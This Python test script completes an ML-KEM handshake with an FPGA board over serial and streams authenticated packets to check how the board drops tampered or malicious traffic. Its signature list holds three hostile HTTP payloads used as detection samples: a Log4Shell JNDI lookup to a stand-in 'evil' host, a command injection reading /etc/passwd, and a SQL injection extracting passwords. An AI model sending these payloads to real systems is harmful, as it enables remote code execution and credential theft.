#!/usr/bin/env python3
"""
test-network/send.py
Legitimate sender: completes the ML-KEM handshake with the board, then streams
authenticated data packets.

    python test-network/send.py --port COM3
    python test-network/send.py --port COM3 --signature     # send one payload
                                                            # containing a known
                                                            # attack signature

Prints [KEM]/[SEC]/[TX] events in the format demo/capture/session_log.py
timestamps, so piping this into it produces the evidence log the report's
timing section depends on:

    python test-network/send.py --port COM3 | python demo/capture/session_log.py
"""

import argparse
import sys
import time

import wire
sys.path.insert(0, wire.os.path.abspath(
    wire.os.path.join(wire.os.path.dirname(__file__), "..")))
from demo.config.demo_config import (BAUD_RATE, PACKET_COUNT,      # noqa: E402
                                     PACKET_INTERVAL_S)

# The signature strings are the ones hardcoded in rtl/detect/cam_matcher.v.
SIGNATURE_PAYLOADS = [
    b"GET /?x=${jndi:ldap://evil/a} HTTP/1.1\r\n\r\n",
    b"POST /shell HTTP/1.1\r\n\r\nid; whoami; cat /etc/passwd",
    b"GET /?q=1' UNION SELECT password FROM users-- HTTP/1.1\r\n\r\n",
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", required=True, help='e.g. COM3 or /dev/ttyUSB0')
    ap.add_argument("--count", type=int, default=PACKET_COUNT)
    ap.add_argument("--interval", type=float, default=PACKET_INTERVAL_S)
    ap.add_argument("--signature", action="store_true",
                    help="include one payload carrying a known signature")
    ap.add_argument("--bad-tag", action="store_true",
                    help="include one packet with a corrupted Poly1305 tag")
    a = ap.parse_args()

    ser = wire.open_serial(a.port, BAUD_RATE)
    s = wire.Session()

    print("[KEM] generating ML-KEM-512 key pair and sending ek (800 B)")
    ser.write(s.handshake_init())
    ser.flush()

    # The board runs Encaps and replies with a 816-byte HS_RESP frame. Measured
    # in simulation at about 24,000 cycles of compute plus the serial time.
    t0 = time.time()
    buf = b""
    while len(buf) < 816 and (time.time() - t0) < 5.0:
        buf += ser.read(816 - len(buf))
    if len(buf) < 816:
        print(f"[ALERT] no ciphertext reply ({len(buf)} of 816 bytes). Is the "
              f"bitstream loaded and is this the right port?")
        return 1

    try:
        key = s.handshake_finish(buf[:816])
    except ValueError as e:
        print(f"[ALERT] handshake reply rejected: {e}")
        return 1
    print(f"[KEM] handshake complete in {time.time() - t0:.3f} s")
    print(f"[SEC] shared secret {key.hex()[:32]}... (32 B, never sent on the wire)")

    n_sig = n_bad = 0
    for i in range(a.count):
        if a.signature and i == a.count // 2:
            pt = SIGNATURE_PAYLOADS[n_sig % len(SIGNATURE_PAYLOADS)]
            n_sig += 1
            print(f"[TX] packet {i}: payload carries a known signature "
                  f"-- expect the board to drop it as SIGNATURE")
            ser.write(s.data(pt))
        elif a.bad_tag and i == (a.count // 2 + 1):
            n_bad += 1
            print(f"[TX] packet {i}: Poly1305 tag corrupted "
                  f"-- expect the board to drop it as BAD_TAG")
            ser.write(s.data(b"harmless looking payload", corrupt_tag=True))
        else:
            ser.write(s.data(f"GET /index.html?seq={i} HTTP/1.1\r\n\r\n".encode()))
            print(f"[TX] packet {i}: clean, {s.nonce_ctr - 1} -> nonce {s.nonce_ctr - 1}")
        ser.flush()
        time.sleep(a.interval)

    print(f"[TX] done: {a.count} packets, {n_sig} with signatures, "
          f"{n_bad} with bad tags")
    return 0


if __name__ == "__main__":
    sys.exit(main())
